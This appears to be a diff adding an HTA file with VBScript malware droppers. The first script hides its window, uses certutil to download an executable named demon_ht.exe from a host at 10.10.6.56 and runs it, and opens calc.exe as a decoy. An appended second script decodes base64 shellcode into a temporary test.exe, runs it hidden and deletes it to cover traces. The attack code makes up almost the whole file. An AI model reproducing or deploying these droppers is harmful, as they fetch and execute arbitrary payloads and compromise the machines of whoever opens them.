@@ -1,0 +1,41 @@
+<HTML>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD>
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "certutil.exe -urlcache -split -f http://10.10.6.56:8001/demon_ht.exe %TEMP%\\demon_ht.exe & %TEMP%\\demon_ht.exe"
+objShell.Run "calc.exe"
+self.close
+</script>
+<body>
+    demo
+</body>
+</HEAD>
+</HTML>
+
+shellcode = WScript.Arguments.Item(0)
+strXML = "" & shellcode & ""
+Set oXMLDoc = CreateObject("MSXML2.DOMDocument.3.0")
+oXMLDoc.LoadXML(strXML) decode = oXMLDoc.selectsinglenode("B64DECODE").nodeTypedValue
+set oXMLDoc = nothing
+ Dim fso
+Set fso = CreateObject("Scripting.FileSystemObject")
+Dim tempdir
+Dim basedir
+Set tempdir = fso.GetSpecialFolder(2)
+basedir = tempdir & "\" & fso.GetTempName()
+fso.CreateFolder(basedir)
+tempexe = basedir & "\" & "test.exe"
+Dim adodbstream
+Set adodbstream = CreateObject("ADODB.Stream")
+adodbstream.Type = 1
+adodbstream.Open
+adodbstream.Write decode
+adodbstream.SaveToFile tempexe, 2
+Dim wshell
+Set wshell = CreateObject("Wscript.Shell")
+wshell.run tempexe, 0, true
+fso.DeleteFile(tempexe)
+fso.DeleteFolder(basedir)
